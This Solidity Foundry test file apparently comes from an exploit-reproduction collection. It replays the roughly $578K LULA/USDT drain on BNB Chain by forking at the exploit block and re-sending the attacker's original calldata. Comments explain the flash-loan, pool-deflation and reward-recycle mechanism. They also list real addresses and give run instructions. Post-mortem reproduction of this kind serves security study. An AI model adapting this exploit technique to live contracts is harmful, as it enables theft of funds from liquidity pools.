// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "forge-std/Test.sol";

// LULA — flash-loan-amplified reward-recycle self-drain on BNB Chain
// ~$578K (578,295 USDT) drained from the LULA/USDT PancakeSwap pair in a single tx.
//
// Exploit tx : 0xa219ab9d57e520e5235b15a8801f4ebac8cc45551be0430ce4e49caea0411d7c (block 112655390)
//   Direct CALL (non-empty `to`): the attacker EOA calls its OWN already-deployed helper
//   contract 0x5E50...A816 with selector 0x763a0e5b(uint256=15000000), forwarding 1e10 wei.
//   The whole flash-loan + swap + claim/recycle loop runs inside that helper.
//
// Root cause (reproducible contract mechanism, NOT a key/signer/privileged-claim compromise):
//   Weeks before the drain the attacker deployed helper/clone contracts and, in EARLIER
//   transactions (~12 days prior), accumulated referral/team "reward" credit inside the LULA
//   token's reward bookkeeping. LULA's reward payout scales with how deflated the LULA/USDT
//   pool is. In the exploit tx the helper flash-loans a large USDT amount, swaps it to sweep
//   LULA out of the pair (maximizing the pool's deflation), then calls the PUBLIC
//   claimReward() -> recycle() path. Because the pre-accumulated reward now redeems against a
//   drained pool, it pays out far more USDT than was ever deposited. The helper repays the
//   flash loan and the attacker EOA nets ~578K USDT. Every step is a public function driven by
//   attacker-controlled on-chain state — no owner key, no privileged signer, no admin call.
//
// The attacker is a plain EOA (code == 0x at the fork block) calling a contract it itself
// deployed, so the faithful reproduction is to fork at the exploit block (where the ~12-day
// pre-accumulated reward state and helper/clone contracts already exist on-chain) and re-issue
// the exact original calldata, pranking the attacker EOA as both msg.sender and tx.origin.
// Calldata and value are hardcoded below (no env vars). We do NOT re-run the 12-day setup.
//
// LULA token   : 0xf5d7029eb6751d170dcF0Bb1c87Af6f93d5A2e9a ("LULA")
// LULA/USDT LP : 0xf0b36389a12a28be1280c0eC2a4bbc76889d6a96 (victim, PancakeSwap pair, drained)
// USDT         : 0x55d398326f99059fF775485246999027B3197955 (18 decimals on BSC)
// Attacker EOA : 0x2677806d48325Ced7533C54B86eD5e99b129a4ED (pure EOA)
// Helper       : 0x5E506Ba06Fa6C61D1069B0E68d7013DE35AFA816 (attacker contract, on-chain)
//
// Run:
//   forge test --contracts ./src/test/2026-07/LULA_exp.sol --evm-version cancun -vvv
//   (cancun is REQUIRED here: without it the Venus rate-model call inside the flash-loan
//   callback dies with a frameless [NotActivated] EvmError)
//   Requires an ARCHIVE BSC RPC (fork points at one directly below).

interface IERC20 {
    function balanceOf(address) external view returns (uint256);
}

contract LULAExp is Test {
    address constant ATTACKER = 0x2677806d48325Ced7533C54B86eD5e99b129a4ED;
    address constant HELPER = 0x5E506Ba06Fa6C61D1069B0E68d7013DE35AFA816;
    address constant USDT = 0x55d398326f99059fF775485246999027B3197955;
    address constant LULA = 0xF5d7029eb6751d170dcF0Bb1c87Af6f93d5A2e9a;
    address constant VICTIM_LP = 0xF0b36389a12A28be1280c0ec2A4bbc76889D6a96; // LULA/USDT pair

    uint256 constant EXPLOIT_BLOCK = 112_655_390;
    uint256 constant TX_VALUE = 10_000_000_000; // 1e10 wei forwarded to the helper (wrapped to WBNB)

    // Working BSC archive endpoint (repo `bsc` alias is dead locally).
    string constant BSC_ARCHIVE = "https://bsc-mainnet.public.blastapi.io";

    // Exact original tx calldata: selector 0x763a0e5b with (uint256 = 0xE4E1C0 = 15_000_000).
    bytes constant EXPLOIT_CALLDATA = hex"763a0e5b0000000000000000000000000000000000000000000000000000000000e4e1c0";

    function setUp() public {
        // Fork one block before the exploit so the LULA/USDT LP reserves are pre-attack while the
        // ~12-day pre-accumulated reward state and attacker helper/clone contracts already exist.
        vm.createSelectFork(BSC_ARCHIVE, EXPLOIT_BLOCK - 1);
        vm.label(ATTACKER, "AttackerEOA");
        vm.label(HELPER, "AttackerHelper");
        vm.label(USDT, "USDT");
        vm.label(LULA, "LULA");
        vm.label(VICTIM_LP, "LULA/USDT_LP");
    }

    function testExploit() public {
        // Sanity: attacker is a pure EOA at the fork block (no privileged contract, no key path).
        assertEq(ATTACKER.code.length, 0, "attacker is not an EOA");

        uint256 attackerPre = IERC20(USDT).balanceOf(ATTACKER);
        uint256 lpUsdtPre = IERC20(USDT).balanceOf(VICTIM_LP);
        uint256 lpLulaPre = IERC20(LULA).balanceOf(VICTIM_LP);
        emit log_named_decimal_uint("Attacker USDT before ", attackerPre, 18);
        emit log_named_decimal_uint("Victim LP USDT before", lpUsdtPre, 18);
        emit log_named_decimal_uint("Victim LP LULA before", lpLulaPre, 18);

        // Give the EOA a little BNB headroom for the forwarded value (it held ~0.35 BNB on-chain).
        vm.deal(ATTACKER, 1 ether);

        // Replay the attack exactly: attacker EOA calls its helper with the original calldata+value.
        vm.prank(ATTACKER, ATTACKER); // msg.sender AND tx.origin = attacker EOA
        (bool ok,) = HELPER.call{value: TX_VALUE}(EXPLOIT_CALLDATA);
        require(ok, "helper call reverted");

        uint256 attackerPost = IERC20(USDT).balanceOf(ATTACKER);
        uint256 lpUsdtPost = IERC20(USDT).balanceOf(VICTIM_LP);
        uint256 attackerGain = attackerPost - attackerPre;
        uint256 lpDrained = lpUsdtPre - lpUsdtPost;

        emit log_named_decimal_uint("Attacker USDT after  ", attackerPost, 18);
        emit log_named_decimal_uint("Victim LP USDT after ", lpUsdtPost, 18);
        emit log_named_decimal_uint("Attacker USDT gain   ", attackerGain, 18);
        emit log_named_decimal_uint("Victim LP USDT drained", lpDrained, 18);

        // Attacker EOA nets ~578,295 USDT, matching the ~$578K incident loss.
        assertApproxEqAbs(attackerGain, 578_295 ether, 2_000 ether, "unexpected attacker USDT gain");
        // The payout comes straight out of the victim pair's USDT reserve.
        assertGe(lpDrained, 578_000 ether, "LP USDT not drained as expected");
    }
}
